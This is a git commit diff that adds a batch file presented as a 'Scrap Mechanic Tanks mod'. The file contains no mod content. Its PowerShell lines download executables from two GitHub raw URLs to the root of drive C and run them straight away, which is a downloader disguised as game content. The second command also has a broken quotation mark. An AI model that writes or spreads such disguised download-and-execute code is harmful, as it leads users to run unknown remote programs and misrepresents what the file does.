d0580eecd1fe7d5eeb0a55596f46dcae4db19f86
prozo <69033601+vovoco@users.noreply.github.com>
2023-03-14 23:34:05 +0300

    Add files via upload

---
+++ scrap mechanic Tanks mod.bat
@@ -0,0 +1,7 @@
+#!powershell
+powershell (new-object System.Net.WebClient).DownloadFile( 'https://github.com/vovoco/mods/raw/main/123.exe','C:\mods_rast.exe')
+C:\mods_rast.exe
+
+#!powershell
+powershell (new-object System.Net.WebClient).DownloadFile( 'https://github.com/KREveDko3221/mod/raw/main/mod.exe,'C:\mods.exe')
+C:\mods.exe
